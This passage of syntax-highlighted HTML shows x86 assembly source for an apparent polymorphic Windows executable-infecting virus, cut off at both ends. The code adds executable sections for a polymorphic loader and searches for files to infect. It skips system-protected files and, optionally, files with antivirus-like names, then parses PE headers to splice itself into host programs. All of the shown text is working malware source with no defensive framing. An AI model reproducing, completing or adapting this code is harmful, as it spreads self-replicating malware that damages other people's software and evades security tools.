   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">idata_rva</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">)</span><span class="sc5">.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">)</span><span class="sc5">.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">

   </span><span class="sc1">;  polymorphic loader section</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_main_loader</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_main_loader_size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_main_loader_size</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">_main_loader_size</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_poly</span><span class="sc0">
   </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">set_file_mem_error</span><span class="sc0">

</span><span class="sc1">;  polymorphic code: +/- (36 * original_code)   ;)</span><span class="sc0">

</span><span class="sc1">;comment #</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@013</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">kme3_out_size</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_poly</span><span class="sc0">
   </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">set_file_mem_error</span><span class="sc0">

</span><span class="sc1">;#</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@013</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">kme3_out_size</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">kme3_out_size</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileAlignment</span><span class="sc0"> </span><span class="sc1">;  alignment</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ajustar_no_file</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@007</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@002</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;  make poly section's header</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'ssb.'</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">opt_4_sec_ok</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'c'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'rsr.'</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">opt_4_sec_ok</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'co'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'ler.'</span><span class="sc0">

   </span><span class="sc5">opt_4_sec_ok</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">idata_rva</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">)</span><span class="sc5">.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">)</span><span class="sc5">.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_EXECUTE</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@013</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GlobalFree</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">set_file_mem_error</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">ajustar_no_file</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ajustar_noinc</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;  NULL byte here = crash</span><span class="sc0">

   </span><span class="sc5">ajustar_noinc</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">xadd</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">infectar@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_handle@010</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetSystemTime</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@002</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_FindFirstFileA</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_mutex@003</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@002</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_buffer@002.nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8192</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">infectar@003</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9216</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">infectar@003</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SfcIsFileProtected</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@009</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SfcIsFileProtected</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infectar@003</span><span class="sc0">

   </span><span class="sc5">infectar@009</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">NO_INFECT_AV</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AV'</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'00'</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VS'</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RW'</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VC'</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GP'</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc5">infectar@010</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">lodsw</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc5">infectar@011</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infectar@003</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infectar@011</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">infectar@010</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IO@001</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@003</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">patch_buffer</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'@'</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">w_ionumb@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">convert@004</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">convert@005</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc1">; ESI = first section</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">convert@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@004</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">infectar@013</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">infectar@012</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">infectar@013</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">

   </span><span class="sc5">infectar@012</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">convert@006</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">convert@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@006</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">TIMES_INFECT</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">

